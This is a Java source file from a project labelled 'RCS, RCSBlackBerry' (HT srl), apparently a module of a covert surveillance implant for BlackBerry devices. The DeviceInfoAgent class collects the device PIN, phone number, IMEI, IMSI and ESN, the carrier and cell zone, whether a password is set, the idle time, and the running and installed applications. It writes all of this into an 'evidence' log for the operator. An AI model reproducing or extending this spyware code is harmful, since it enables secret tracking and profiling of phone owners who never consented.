//#preprocess
/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry
 * Package      : blackberry.agent
 * File         : DeviceInfoAgent.java
 * Created      : 28-apr-2010
 * *************************************************/
package blackberry.agent;

import java.io.EOFException;
import java.util.Date;
import java.util.Enumeration;
import java.util.Hashtable;

import net.rim.device.api.system.ApplicationDescriptor;
import net.rim.device.api.system.ApplicationManager;
import net.rim.device.api.system.CodeModuleGroup;
import net.rim.device.api.system.CodeModuleGroupManager;
import net.rim.device.api.system.CodeModuleManager;
import net.rim.device.api.system.DeviceInfo;
import net.rim.device.api.system.GPRSInfo;
import net.rim.device.api.system.RadioInfo;
import net.rim.device.api.ui.Keypad;
import net.rim.device.api.util.DataBuffer;
import net.rim.device.api.util.NumberUtilities;
import blackberry.Device;
import blackberry.config.Conf;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;
import blackberry.evidence.Evidence;
import blackberry.evidence.EvidenceType;
import blackberry.fs.Path;
import blackberry.utils.Check;

/**
 * The Class DeviceInfoAgent.
 */
public final class DeviceInfoAgent extends Module {
    //#ifdef DEBUG
    static Debug debug = new Debug("DeviceInfoAgent", DebugLevel.VERBOSE);
    //#endif

    Device device;
    boolean runningApplication;
    boolean installedApplication;

    /**
     * Instantiates a new device info agent.
     * 
     * @param agentStatus
     *            the agent status
     */
    public DeviceInfoAgent(final boolean agentEnabled) {
        super(AGENT_DEVICE, agentEnabled, Conf.AGENT_DEVICEINFO_ON_SD,
                "DeviceInfoAgent");
        //#ifdef DBC
        Check.asserts(
                Evidence.convertTypeEvidence(agentId) == EvidenceType.DEVICE,
                "Wrong Conversion");
        //#endif

        device = Device.getInstance();
    }

    /**
     * Instantiates a new device info agent.
     * 
     * @param agentStatus
     *            the agent status
     * @param confParams
     *            the conf params
     */
    protected DeviceInfoAgent(final boolean agentStatus, final byte[] confParams) {
        this(agentStatus);
        parse(confParams);
    }

    /*
     * (non-Javadoc)
     * @see blackberry.threadpool.TimerJob#actualRun()
     */
    public void actualGo() {
        //#ifdef DBC
        Check.requires(evidence != null, "Null log");
        //#endif

        boolean ret = true;

        final StringBuffer sb = new StringBuffer();

        // Modello
        // sb.append("Processor: ARM\n");
        if (DeviceInfo.isSimulator()) {
            sb.append("Simulator\n");
        }

        //#ifdef DEBUG
        sb.append("Debug\n");
        //#endif

        sb.append("-- SYSTEM --\r\n");
        sb.append("Manifacturer: " + DeviceInfo.getManufacturerName() + "\n");
        sb.append("Model: " + DeviceInfo.getDeviceName() + "\n");
        sb.append("Pin: " + Device.getPin() + "\n");

        sb.append("-- OS --\r\n");
        sb.append("Platform: " + DeviceInfo.getPlatformVersion() + "\n");
        sb.append("OS: " + DeviceInfo.getSoftwareVersion() + "\n");

        sb.append("IdleTime: " + DeviceInfo.getIdleTime() + "\n");
        sb.append("Holster: " + DeviceInfo.isInHolster() + "\n");
        sb.append("PasswordEnabled: " + DeviceInfo.isPasswordEnabled() + "\n");

        sb.append("-- HARDWARE --\r\n");
        sb.append("Total RAM: " + Runtime.getRuntime().totalMemory() + "\n");
        sb.append("Free RAM: " + Runtime.getRuntime().freeMemory() + "\n");
        sb.append("Camera: " + DeviceInfo.hasCamera() + "\n");
        sb.append("Phone: " + device.getPhoneNumber() + "\n");
        sb.append("Keypad layout: ");
        int keyLayout=Keypad.getHardwareLayout();
        switch(keyLayout){
            case Keypad.HW_LAYOUT_32:
                sb.append("32 " + "\n");
                break;
            case Keypad.HW_LAYOUT_39:
                sb.append("39" + "\n");
                break;
            case Keypad.HW_LAYOUT_LEGACY:
                sb.append("LEGACY" + "\n");
                break;
            case Keypad.HW_LAYOUT_PHONE:
                sb.append("PHONE" + "\n");
                break;
            case Keypad.HW_LAYOUT_REDUCED_24:
                sb.append("REDUCED" + "\n");
                break;
/*            case Keypad.HW_LAYOUT_TOUCHSCREEN_12:
                sb.append("TOUCH " + "\n");
                break;
            case Keypad.HW_LAYOUT_TOUCHSCREEN_12A:
                sb.append("TOUCH " + "\n");
                break;
            case Keypad.HW_LAYOUT_TOUCHSCREEN_12C:
                sb.append("TOUCH " + "\n");
                break;
            case Keypad.HW_LAYOUT_TOUCHSCREEN_12H:
                sb.append("TOUCH " + "\n");
                break;
            case Keypad.HW_LAYOUT_TOUCHSCREEN_20J:
                sb.append("TOUCH " + "\n");
                break;
            case Keypad.HW_LAYOUT_TOUCHSCREEN_20JA:
                sb.append("TOUCH " + "\n");
                break;
            case Keypad.HW_LAYOUT_TOUCHSCREEN_20K:
                sb.append("TOUCH " + "\n");
                break;*/
                
                default:
                    sb.append("UNK " +keyLayout+ "\n");
                    break;
               
        }

        // Alimentazione
        sb.append("-- POWER --\r\n");
        sb.append("Battery: " + DeviceInfo.getBatteryLevel() + "%\n");
        sb.append("BatteryStatus: " + DeviceInfo.getBatteryStatus() + "\n");
        sb.append("BatteryTemperature: " + DeviceInfo.getBatteryTemperature()
                + " Degrees\n");
        sb.append("BatteryVoltage: " + DeviceInfo.getBatteryVoltage() + " V\n");

        // Radio
        sb.append("-- RADIO --\r\n");
        if (Device.isCDMA()) {
            sb.append("CDMA\n");
            sb.append("SID: " + device.getSid() + "\n");
            sb.append("ESN: " + NumberUtilities.toString(device.getEsn(), 16)
                    + "\n");
        } else if(Device.isGPRS()) {
            sb.append("GPRS\n");
            sb.append("IMEI: " + device.getImei() + "\n");
            sb.append("IMSI: " + device.getImsi() + "\n");
            sb.append("HomeMCC: " + GPRSInfo.getHomeMCC() + "\n");
            sb.append("HomeMNC: " + GPRSInfo.getHomeMNC() + "\n");
            sb.append("RSSI: " + GPRSInfo.getCellInfo().getRSSI() + "\n");
            sb.append("Zone name: " + GPRSInfo.getZoneName() + "\n");
        } else if(Device.isIDEN()){
            sb.append("IDEN\n");
        }

        try {
            sb.append("Active Wafs: " + RadioInfo.getActiveWAFs() + "\n");
            sb.append("Carrier: " + RadioInfo.getCurrentNetworkName() + "\n");
            sb.append("Enabled Wafs: " + RadioInfo.getEnabledWAFs() + "\n");

            final String code = RadioInfo.getNetworkCountryCode(RadioInfo
                    .getCurrentNetworkIndex());

            if (code != null) {
                sb.append("Country Code: "
                        + RadioInfo.getNetworkCountryCode(RadioInfo
                                .getCurrentNetworkIndex()) + "\n");
            }

            sb.append("Network Services: " + RadioInfo.getNetworkService()
                    + "\n");
            sb.append("Network Type: " + RadioInfo.getNetworkType() + "\n");
            sb.append("Signal level: " + RadioInfo.getSignalLevel() + " dB\n");
            sb.append("DataServiceOperational: "
                    + RadioInfo.isDataServiceOperational() + "\n");
            sb.append("DataServiceSuspended: "
                    + RadioInfo.isDataServiceSuspended() + "\n");
            // sb.append(": " + RadioInfo.);
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error("Radio: " + ex);
            //#endif
        }

        sb.append("-- FLASH --\r\n");
        sb.append("Flash Size: " + DeviceInfo.getTotalFlashSize() + " Bytes\n");

        sb.append("Free flash: " + Path.freeSpace(Path.USER) + " Bytes\n");
        if (Path.isSDAvailable()) {
            sb.append("SD size: " + Path.totalSpace(Path.SD) + " Bytes\n");
            sb.append("Free SD: " + Path.freeSpace(Path.SD) + " Bytes\n");
        }

        sb.append("-- APPLICATIONS --\r\n");
        sb.append(getRunningApplications());

        try {
            if (this.installedApplication) {

                sb.append(getInstalledModuleGroup());
                // sb.append(getInstalledApplications());
            }
        } catch (final Exception ex) {
            //#ifdef DEBUG
            debug.error(ex);
            //#endif
        }

        evidence.atomicWriteOnce(sb.toString());

    }

    /**
     * Gets the running applications.
     * 
     * @return the running applications
     */
    String getRunningApplications() {
        final StringBuffer sb = new StringBuffer();

        final ApplicationManager manager = ApplicationManager
                .getApplicationManager();

        final int foregroundProcess = manager.getForegroundProcessId();
        sb.append("Foreground process: " + foregroundProcess);

        sb.append("\r\nRunning applications: \r\n");

        // Check to see if application is running.
        final ApplicationDescriptor[] descriptors = manager
                .getVisibleApplications();
        // Retrieve the name of a running application.
        for (int i = 0; i < descriptors.length; i++) {
            final ApplicationDescriptor descriptor = descriptors[i];
            sb.append(descriptor.getName());
            sb.append(" ");
            sb.append(descriptor.getVersion());
            sb.append(" ");
            sb.append(descriptor.getFlags());
            sb.append(" ");
            if (manager.getProcessId(descriptor) == foregroundProcess) {
                sb.append(" FOREGROUND");
            }
            if ((descriptor.getPowerOnBehavior() & ApplicationDescriptor.FLAG_RUN_ON_STARTUP) != 0) {
                sb.append(" AUTOSTARTUP");
            }
            sb.append("\r\n");
        }

        return sb.toString();
    }

    /**
     * Gets the running applications.
     * 
     * @return the running applications
     */
    String getInstalledApplications() {
        final StringBuffer sb = new StringBuffer();
        sb.append("\r\nInstalled applications: \r\n");

        // Retrieve an array of handles for existing modules on a BlackBerry
        // device
        final int handles[] = CodeModuleManager.getModuleHandles();

        final int size = handles.length;
        for (int i = 0; i < size; i++) {
            final int handle = handles[i];
            // CodeModuleManager.getModuleHandle(name)
            // Retrieve specific information about a module.
            final String name = CodeModuleManager.getModuleName(handle);
            final String vendor = CodeModuleManager.getModuleVendor(handle);
            final String description = CodeModuleManager
                    .getModuleDescription(handle);
            final String version = CodeModuleManager.getModuleVersion(handle);
            final int moduleSize = CodeModuleManager.getModuleCodeSize(handle);
            final long timestamp = CodeModuleManager.getModuleTimestamp(handle);

            final Date date = new Date(timestamp);

            sb.append(name);
            sb.append(" , ");
            sb.append(vendor);
            sb.append("\r\n");
        }

        return sb.toString();
    }

    String getInstalledModuleGroup() {
        final StringBuffer sb = new StringBuffer();
        sb.append("\r\nInstalled Module Group: \r\n\r\n");

        // Retrieve an array of handles for existing modules on a BlackBerry
        // device
        final CodeModuleGroup handles[] = CodeModuleGroupManager.loadAll();
        // Retrieve an array of handles for existing modules on a BlackBerry
        // device
        final int AllModulesHandles[] = CodeModuleManager.getModuleHandles();
        final Hashtable remainigModules = new Hashtable();
        int size = AllModulesHandles.length;
        for (int i = 0; i < size; i++) {
            remainigModules
                    .put(new Integer(AllModulesHandles[i]), new Object());
        }

        if (handles == null) {
            size = 0;
        } else {
            size = handles.length;
        }
        for (int i = 0; i < size; i++) {
            final CodeModuleGroup group = handles[i];

            // Retrieve specific information about a module.
            final String name = group.getName();
            final String copyright = group.getCopyright();
            final String description = group.getDescription();
            final int flags = group.getFlags();
            final String friendly = group.getFriendlyName();
            final String vendor = group.getVendor();
            final String version = group.getVersion();

            if (name == Conf.GROUP_NAME) {
                sb.append("******************\r\n");

            }

            sb.append(name);
            sb.append(" , ");
            sb.append(vendor);
            sb.append(" , ");
            sb.append(flags);
            sb.append(" , ");
            sb.append(version);
            sb.append("\r\n");

            final Enumeration enumerator = group.getModules();
            while (enumerator.hasMoreElements()) {
                final String moduleName = (String) enumerator.nextElement();
                final int handle = CodeModuleManager
                        .getModuleHandle(moduleName);
                // Retrieve specific information about a module.

                sb.append("--> " + moduleName);
                if (handle > 0) {
                    remainigModules.remove(new Integer(handle));
                    final String vendorModule = CodeModuleManager
                            .getModuleVendor(handle);
                    final String versionModule = CodeModuleManager
                            .getModuleVersion(handle);
                    sb.append(", " + vendorModule);
                    sb.append(", " + versionModule);

                    final ApplicationDescriptor[] descr = CodeModuleManager
                            .getApplicationDescriptors(handle);
                    if (descr != null && descr.length > 0) {
                        sb.append(", ( ");
                        for (int j = 0; j < descr.length; j++) {
                            sb.append(descr[j].getFlags() + " ");
                        }
                        sb.append(")");
                    }
                }
                sb.append("\r\n");
            }

            sb.append("\r\n");

        }

        sb.append("\r\nUngrouped:\r\n\r\n");
        final Enumeration enumeration = remainigModules.keys();
        while (enumeration.hasMoreElements()) {
            final Integer handle = (Integer) enumeration.nextElement();

            final String nameModule = CodeModuleManager.getModuleName(handle
                    .intValue());
            final String vendorModule = CodeModuleManager
                    .getModuleVendor(handle.intValue());
            final String versionModule = CodeModuleManager
                    .getModuleVersion(handle.intValue());

            sb.append(nameModule);
            sb.append(", " + vendorModule);
            sb.append(", " + versionModule);
            sb.append("\r\n");
        }
        final String ret = sb.toString();
        return ret;
    }

    /*
     * (non-Javadoc)
     * @see blackberry.agent.Agent#parse(byte[])
     */
    protected boolean parse(final byte[] confParams) {
        final DataBuffer databuffer = new DataBuffer(confParams, 0,
                confParams.length, false);
        try {
            installedApplication = databuffer.readInt() == 1;
            runningApplication = installedApplication;
        } catch (final EOFException e) {
            return false;
        }

        //#ifdef DEBUG
        debug.info("installedApplication: " + installedApplication);
        //#endif

        return true;
    }

}
